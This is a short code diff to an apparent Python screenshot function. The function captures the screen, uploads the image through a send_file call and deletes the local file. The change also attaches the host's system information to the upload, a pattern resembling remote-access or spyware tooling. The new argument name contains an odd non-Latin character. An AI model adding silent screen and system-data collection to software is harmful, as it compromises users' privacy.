@@ -25,7 +25,7 @@ def screenshot(request: Request) -> str:
         # Save the image to the file object as a PNG
         screenshot.save(file, "PNG")
 
-    res = request.engine.send_file(file_name)
+    res = request.engine.send_file(file_name, additionalـinfo=request.system_info(minimal=True))
     os.remove(file_name)
 
     if res:
